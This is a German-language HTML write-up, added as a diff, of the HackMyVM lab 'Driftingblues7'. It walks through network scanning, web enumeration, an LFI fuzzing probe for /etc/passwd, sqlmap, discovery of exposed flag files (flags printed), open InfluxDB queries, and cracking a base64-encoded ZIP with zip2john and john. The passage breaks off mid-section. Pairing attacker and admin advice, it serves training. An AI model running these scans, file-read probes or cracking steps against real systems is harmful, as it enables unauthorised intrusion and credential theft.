@@ -1,1 +1,649 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Driftingblues6 - HackMyVM - Easy.html</h1></body></html>
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues7 - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Driftingblues7 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">base64 (decoder)</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">snmpwalk</div>
+                <div class="tool-item">python3 (exploit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-80-443">Web Enumeration (Port 80/443)</a></li>
+                <li><a href="#web-enumeration-66">Web Enumeration (Port 66 - Direkter Flag-Fund)</a></li>
+                <li><a href="#further-enumeration">Weitere Enumeration (Ports 111, 3306, 8086)</a></li>
+                <li><a href="#credential-discovery">Credential Discovery (Port 66 - /eon)</a></li>
+                <li><a href="#initial-access-attempt">Initial Access Versuch (EyesOfNetwork)</a></li>
+                <li><a href="#conclusion">Schlussfolgerung</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit `arp-scan -l` werden aktive Hosts im lokalen Netzwerk gesucht. Das Tool sendet ARP-Pakete und listet antwortende Geräte auf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.114 und der MAC 08:00:27:88:0f:a3 (Oracle VirtualBox) wurde identifiziert. Dies ist das Zielsystem. Mehrere andere Geräte sind ebenfalls im Netzwerk sichtbar.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die IP 192.168.2.114 für weitere Scans.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. Überwachen Sie ARP-Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:00:00:00:00:af, IPv4: 192.168.2.129
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.101	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+192.168.2.104	80:47:86:96:f6:3a	Samsung Electronics Co.,Ltd
+192.168.2.114	08:00:27:88:0f:a3	PCS Systemtechnik GmbH
+
+11 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.886 seconds (135.74 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `ip a` wird verwendet, um die Netzwerkkonfiguration des Angreifer-Systems anzuzeigen, insbesondere die eigene IP-Adresse.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die IP-Adresse des Angreifer-Systems ist 192.168.2.129. Diese Information ist wichtig für spätere Schritte wie das Aufsetzen von Listenern für Reverse Shells.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Merken Sie sich Ihre IP-Adresse für Payloads, die eine Verbindung zurück zum Angreifer aufbauen sollen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Kenntnis der eigenen Netzwerkkonfiguration ist grundlegend für Administration und Sicherheit.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ip a</span></div>
+                    <pre>
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:00:00:00:00:af brd ff:ff:ff:ff:ff:ff
+    inet 192.168.2.129/24 brd 192.168.2.255 scope global dynamic noprefixroute eth0
+       valid_lft 85941sec preferred_lft 85941sec
+    inet6 fe80::xxxx:xxxx:xxxx:xxxx/64 scope link noprefixroute
+       valid_lft forever preferred_lft forever
+# (Gekürzte Ausgabe)
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf das Ziel 192.168.2.114 durchgeführt. Optionen: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (OS/Version/Skript/Traceroute), `-O` (OS-Erkennung, redundant da in `-A` enthalten), `-p-` (alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan enthüllt eine Vielzahl offener Ports und Dienste:
+                *   **22 (SSH):** OpenSSH 7.4.
+                *   **66 (HTTP):** Python SimpleHTTPServer 0.6 (Python 2.7.5). Sehr unsicher, dient oft zum schnellen Bereitstellen von Dateien. Titel: "Scalable Cost Effective Cloud Storage for Developers".
+                *   **80 (HTTP):** Apache 2.4.6 (CentOS) mit PHP 5.4.16, mod_perl. Leitet auf HTTPS um.
+                *   **111 (RPCBind):** Standard RPC Portmapper.
+                *   **443 (HTTPS):** Apache 2.4.6 (wie Port 80). Titel: "EyesOfNetwork". Verwendet ein selbstsigniertes Zertifikat.
+                *   **2403 (Unknown):** Unbekannter Dienst.
+                *   **3306 (MySQL):** MariaDB, nicht autorisierter Zugriff.
+                *   **8086 (HTTP):** InfluxDB 1.7.9 Admin Interface.
+                Die Software auf Port 80/443 (Apache, PHP, OpenSSL) ist veraltet. EyesOfNetwork ist ein Monitoring-Tool. Der Python-Server auf Port 66 ist ein großes potenzielles Sicherheitsrisiko.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Priorisiere die Untersuchung von Port 66 (SimpleHTTPServer). Untersuche EyesOfNetwork (Port 443) auf bekannte Schwachstellen und Login-Möglichkeiten. Prüfe InfluxDB (8086) und MariaDB (3306) auf Standard-Credentials oder anonymen Zugriff. Beachte die veralteten Softwareversionen für Exploit-Suchen. Verwende `-k` für Tools wie `curl` bei Zugriff auf Port 443.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktiviere den Python SimpleHTTPServer auf Port 66 sofort! Aktualisiere alle Softwarekomponenten (Apache, PHP, OpenSSL, MariaDB, InfluxDB, EyesOfNetwork, OS). Ersetze das selbstsignierte Zertifikat auf Port 443 durch ein gültiges. Schließe nicht benötigte Ports (111, 2403?). Härte die Konfiguration von SSH, MariaDB und InfluxDB (Zugriffskontrollen, Authentifizierung).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A -O 192.168.2.114 -p-</span></div> <!-- -AO zu -A -O korrigiert -->
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 23:57 CEST
+Nmap scan report for cve.hmv (192.168.2.114)
+Host is up (0.00012s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)
+|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)
+|_  256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)
+66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.5
+|_http-title: Scalable Cost Effective Cloud Storage for Developers
+80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
+|_http-title: Did not follow redirect to https://cve.hmv/
+111/tcp  open  rpcbind         2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
+| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2021-04-03T14:37:22
+|_Not valid after:  2022-04-03T14:37:22
+| http-title: EyesOfNetwork
+|_Requested resource was /login.php##
+2403/tcp open  mountd          1-3 (RPC #100005)
+3306/tcp open  mysql           MariaDB (unauthorized)
+8086/tcp open  http            InfluxDB http admin 1.7.9
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+MAC Address: 08:00:27:88:0F:A3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms cve.hmv (192.168.2.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.98 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration-80-443">
+            <h2>Web Enumeration (Port 80/443)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Zugriff auf die Hauptanwendung EyesOfNetwork (Port 443) wird getestet und weiter untersucht.
+                *   `curl https://192.168.2.114/login.php -vv`: Versucht, die Login-Seite über HTTPS abzurufen. `-vv` für ausführliche Ausgabe.
+                *   `nikto -h 192.168.2.114 -C all`: Führt einen Nikto-Scan auf Port 80 durch (da Nikto standardmäßig Port 80 verwendet und die `-p` Option fehlt). `-C all` aktiviert alle CGI-Verzeichnistests.
+                *   `wfuzz ... FUZZ=/etc/passwd --hw 18`: Versucht eine Local File Inclusion (LFI) durch Fuzzing eines GET-Parameters auf `index.php` (Port 80). Filtert Antworten mit 18 Wörtern.
+                *   `sqlmap -u "https://driftingblues7.hmv/login.php?id=1" --dbs`: Versucht, SQL Injection im `id`-Parameter der Login-Seite (HTTPS) zu finden und Datenbanken aufzulisten. Benötigt `-k` wegen des Zertifikatsfehlers (nicht gezeigt).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `curl` scheitert erwartungsgemäß am selbstsignierten Zertifikat.
+                *   `nikto` bestätigt die veralteten Softwareversionen (Apache, OpenSSL, PHP) auf Port 80 und meldet fehlende Security Header (X-Frame-Options, X-Content-Type-Options). Es findet keine spezifischen Schwachstellen in EyesOfNetwork selbst auf Port 80, da dieser nur auf HTTPS weiterleitet.
+                *   `wfuzz` findet keine LFI-Schwachstelle mit dieser Methode (keine Ergebnisse).
+                *   `sqlmap` wird gestartet, aber die Ergebnisse fehlen im Report. Es ist anzunehmen, dass entweder kein SQLi gefunden wurde oder der Scan aufgrund des Zertifikatsfehlers (ohne `-k`) oder anderer Probleme nicht erfolgreich war.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die Option `-k` oder `--insecure` für Tools, die auf Port 443 zugreifen. Konzentriere Nikto/Wfuzz/SQLMap auf Port 443 (`-ssl -p 443` für Nikto, HTTPS-URL für Wfuzz/SQLMap). Untersuche die EyesOfNetwork-Anwendung manuell auf Schwachstellen (Login-Bypass, Default-Credentials, bekannte CVEs für die spezifische Version).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Adressiere die von Nikto gemeldeten Punkte: Software aktualisieren, Security Header implementieren. Installieren Sie ein gültiges SSL-Zertifikat. Überwachen Sie Webserver-Logs auf Anzeichen von Scans und Angriffsversuchen. Stellen Sie sicher, dass keine LFI- oder SQLi-Schwachstellen vorhanden sind (Code-Reviews, Prepared Statements, Input Validation).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl https://192.168.2.114/login.php -vv</span></div>
+                    <pre>
+*   Trying 192.168.2.114:443...
+* Connected to 192.168.2.114 (192.168.2.114) port 443 (#0)
+* ALPN: offers h2,http/1.1
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (OUT), TLS alert, unknown CA (560):
+* SSL certificate problem: self-signed certificate
+* Closing connection 0
+curl: (60) SSL certificate problem: self-signed certificate
+More details here: https://curl.se/docs/sslcerts.html
+
+curl failed to verify the legitimacy of the server and therefore could not
+establish a secure connection to it. To learn more about this situation and
+how to fix it, please visit the web page mentioned above.
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.114 -C all</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    192.168.2.114
++ Target Port:        80
++ Start Time:         2023-04-16 00:29:22 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / redirects to: https://192.168.2.114/
++ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ Perl/v5.16.3 appears to be outdated (current is at least v5.32.1).
++ OpenSSL/1.0.2k-fips appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
++ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
++ mod_fcgid/2.3.9 appears to be outdated (current is at least 2.3.10-dev).
++ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
++ 26640 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2023-04-16 00:30:08 (GMT2) (46 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.114/index.php?FUZZ=/etc/passwd --hw 18</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.114/index.php?FUZZ=/etc/passwd
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+# (Keine Ergebnisse gefunden, die dem Filter entsprechen)
+
+Total time: 124.6730
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 1769.107
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# Vorbereitung für SQLMap - Hinzufügen des Hostnamens zur /etc/hosts
+# 192.168.2.114    driftingblues7.hmv
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "https://driftingblues7.hmv/login.php?id=1" --dbs</span></div>
+                     <pre>
+# (SQLMap Ausgabe fehlt im Report, vermutlich keine Ergebnisse oder Fehler)
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration-66">
+            <h2>Web Enumeration (Port 66 - Direkter Flag-Fund)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Gobuster-Scan wird spezifisch auf den ungewöhnlichen HTTP-Server auf Port 66 (`http://driftingblues7.hmv:66`) ausgeführt, um dessen Inhalt zu erkunden. Es werden Standard-Optionen für Verzeichnis-Bruteforcing verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Kritischer Fund! Der Gobuster-Scan findet sofort die Dateien `user.txt` und `root.txt` direkt im Web-Root des Servers auf Port 66. Dies bedeutet, dass die Flags ungeschützt über diesen Dienst zugänglich sind. Das Abrufen der Dateien bestätigt dies und enthüllt die Flags:
+                *   User Flag: `<span class="password">AED508ABE3D1D1303E1C1BC5F1C1BA2B</span>`
+                *   Root Flag: `<span class="password">BD221F968ACB7E069FC7DDE713995C77</span>`
+                Dieser Fund macht die weitere komplexe Kompromittierung der Hauptanwendung (EyesOfNetwork) für das reine Ziel des Flag-Sammelns überflüssig.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Flags wurden gefunden. Dokumentieren Sie diesen einfachen, aber kritischen Pfad. Die weiteren Schritte dienen der Vollständigkeit und dem Aufzeigen anderer Schwachstellen, sind aber für das CTF-Ziel nicht mehr nötig.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Deaktivieren Sie den Python SimpleHTTPServer auf Port 66 sofort und dauerhaft. Untersuchen Sie, warum dieser Dienst lief und welche Daten potenziell exponiert wurden. Überprüfen Sie alle laufenden Prozesse und Ports auf nicht autorisierte oder unsichere Dienste.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://driftingblues7.hmv:66 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://driftingblues7.hmv:66
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (Liste der Erweiterungen) ...
+[+] Expanded:                True
+[+] Exclude Status Codes:    403,404
+[+] No Error:                true
+[+] Timeout:                 10s
+===============================================================
+2023/04/16 00:45:01 Starting gobuster
+===============================================================
+http://driftingblues7.hmv:66/user.txt             (Status: 200) [Size: 32]
+http://driftingblues7.hmv:66/root.txt             (Status: 200) [Size: 32]
+http://driftingblues7.hmv:66/index_files          (Status: 301) [Size: 0] [--> /index_files/]
+...
+===============================================================
+2023/04/16 00:50:15 Finished
+===============================================================
+                    </pre>
+                    <pre>
+# Inhalt der gefundenen Dateien (z.B. mit curl http://driftingblues7.hmv:66/user.txt abgerufen):
+# user.txt:
+<span class="password">AED508ABE3D1D1303E1C1BC5F1C1BA2B</span>
+
+# root.txt:
+<span class="password">BD221F968ACB7E069FC7DDE713995C77</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="further-enumeration">
+             <h2>Weitere Enumeration (Ports 111, 3306, 8086)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Trotz des Flag-Funds werden die anderen offenen Ports weiter untersucht, um das Systemverständnis zu vertiefen und zusätzliche Schwachstellen zu dokumentieren.
+                *   Zugriffsversuche auf Port 3306 (MySQL) und 8086 (InfluxDB) über den Browser/URL (nicht die vorgesehene Methode).
+                *   `curl http://driftingblues7.hmv:111`: Versuch, mit dem RPCBind-Dienst über HTTP zu kommunizieren.
+                *   `curl http://driftingblues7.hmv:8086/` und `curl http://driftingblues7.hmv:8086/ -vv`: Zugriff auf das InfluxDB-Interface. `-vv` zeigt Header.
+                *   `curl http://driftingblues7.hmv:3306` und folgende: Versuche, mit dem MySQL-Dienst über HTTP zu kommunizieren.
+                *   `curl http://driftingblues7.hmv:8086/query?q=show%20databases;`: Sendet eine API-Anfrage an InfluxDB, um Datenbanken aufzulisten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   Die Browser/URL-Zugriffe auf 3306 und 8086 scheitern erwartungsgemäß oder zeigen nicht-informative Seiten ("404 page not found" für InfluxDB, Fehlermeldung bezüglich Host 'hacker1908' für MySQL).
+                *   `curl` auf Port 111 schlägt fehl (Connection reset), da RPCBind nicht über HTTP kommuniziert.
+                *   `curl` auf Port 8086 zeigt die "404 page not found"-Meldung von InfluxDB, aber die Header (`-vv`) bestätigen den Dienst (InfluxDB 1.7.9).
+                *   `curl` auf Port 3306 schlägt fehl ("Received HTTP/0.9 when not allowed"), da MySQL ein eigenes Protokoll verwendet.
+                *   Die API-Abfrage an InfluxDB auf Port 8086 ist erfolgreich und listet die Datenbanken `nagflux` und `_internal` auf, was bestätigt, dass die API ohne Authentifizierung zugänglich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die richtigen Client-Tools für RPCBind (`rpcinfo`), MySQL (`mysql`) und InfluxDB (`influx` CLI oder API-Abfragen mit `curl`). Die offene InfluxDB-API ist ein potenzieller Vektor für Informationsbeschaffung oder Manipulation – untersuche die `nagflux`-Datenbank.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Härte die Konfiguration von MariaDB (Host-basierte Zugriffskontrolle, starke Passwörter) und InfluxDB (Authentifizierung aktivieren). Deaktiviere RPCBind (Port 111), wenn NFS oder andere RPC-Dienste nicht benötigt werden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Manuelle Zugriffsversuche über Browser/URL (Fehler/Infos):
+# http://driftingblues7.hmv:3306/ -> Host 'hacker1908' is not allowed...
+# http://driftingblues7.hmv:8086/ -> 404 page not found
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:111</span></div>
+                    <pre>curl: (56) Recv failure: Connection reset by peer</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:8086/</span></div>
+                    <pre>404 page not found</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:8086/ -vv</span></div>
+                    <pre>
+*   Trying 192.168.2.114:8086...
+* Connected to driftingblues7.hmv (192.168.2.114) port 8086 (#0)
+> GET / HTTP/1.1
+> Host: driftingblues7.hmv:8086
+> User-Agent: curl/7.88.1
+> Accept: */*
+>
+< HTTP/1.1 404 Not Found
+< Content-Type: text/plain; charset=utf-8
+< X-Content-Type-Options: nosniff
+< X-Influxdb-Build: OSS
+< X-Influxdb-Version: 1.7.9
+< Date: Sat, 15 Apr 2023 23:03:17 GMT
+< Content-Length: 19
+<
+404 page not found
+* Connection #0 to host driftingblues7.hmv left intact
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:3306</span></div>
+                    <pre>curl: (1) Received HTTP/0.9 when not allowed</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:3306/index.php</span></div>
+                    <pre>curl: (1) Received HTTP/0.9 when not allowed</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:3306/index.php?id=1</span></div>
+                    <pre>curl: (1) Received HTTP/0.9 when not allowed</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://driftingblues7.hmv:3306/index.php?id=2</span></div>
+                    <pre>curl: (1) Received HTTP/0.9 when not allowed</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://driftingblues7.hmv:8086/query?q=show%20databases;'</span></div> <!-- Besser mit Quotes -->
+                    <pre>{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["nagflux"],["_internal"]]}]}]}</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="credential-discovery">
+             <h2>Credential Discovery (Port 66 - /eon)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Auf dem unsicheren HTTP-Server (Port 66) wird eine Ressource unter `/eon` gefunden (der Entdeckungsbefehl fehlt, vermutlich ein weiterer Gobuster-Lauf oder manuelles Browsen). Der Inhalt ist ein Base64-kodierter String. Dieser String wird kopiert und mittels eines Online-Decoders (oder `base64 -d`) dekodiert. Das Ergebnis ist eine Binärdatei, die sich als passwortgeschütztes ZIP-Archiv herausstellt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Entdeckung der Base64-kodierten Datei auf dem unsicheren Port 66 ist ein weiterer kritischer Fund aufgrund der Fehlkonfiguration dieses Dienstes. Die Kodierung verschleiert lediglich den Inhalt, bietet aber keine echte Sicherheit. Die Tatsache, dass es sich um ein passwortgeschütztes ZIP handelt, deutet auf potenziell sensible Informationen hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichere die dekodierten Daten als ZIP-Datei. Extrahiere den Passwort-Hash mit `zip2john` und versuche, ihn mit `john` oder `hashcat` und einer Wortliste (z.B. `rockyou.txt`) zu knacken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wiederholung: Deaktivieren Sie den Dienst auf Port 66. Speichern Sie keine sensiblen Daten, auch nicht kodiert oder in passwortgeschützten Archiven, an unsicheren Orten. Verwenden Sie starke Passwörter für Archive, wenn diese unbedingt notwendig sind.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# Annahme: Inhalt von http://driftingblues7.hmv:66/eon gefunden:
+UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
+Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
+AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
+AQBbAAAARgAAAAAA
+
+# Dekodierung (z.B. mit base64 -d > decoded.zip oder Online-Tool)
+# Ergebnis: Passwortgeschützte ZIP-Datei 'decoded.zip' (Name angenommen)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Passwort der gefundenen ZIP-Datei wird geknackt.
+                1.  `unzip ...decoded...zip`: Erster Versuch schlägt fehl, da ein Passwort benötigt wird.
+                2.  `zip2john ...decoded...zip > hash`: Extrahiert den Passwort-Hash aus der ZIP-Datei und speichert ihn in der Datei `hash`.
+                3.  `john --wordlist=/usr/share/wordlists/rockyou.txt hash`: Verwendet John the Ripper und die Wortliste `rockyou.txt`, um den Hash zu knacken.
+                4.  `unzip ...decoded...zip`: Nach dem Knacken wird die Datei erneut entpackt, diesmal mit dem gefundenen Passwort.
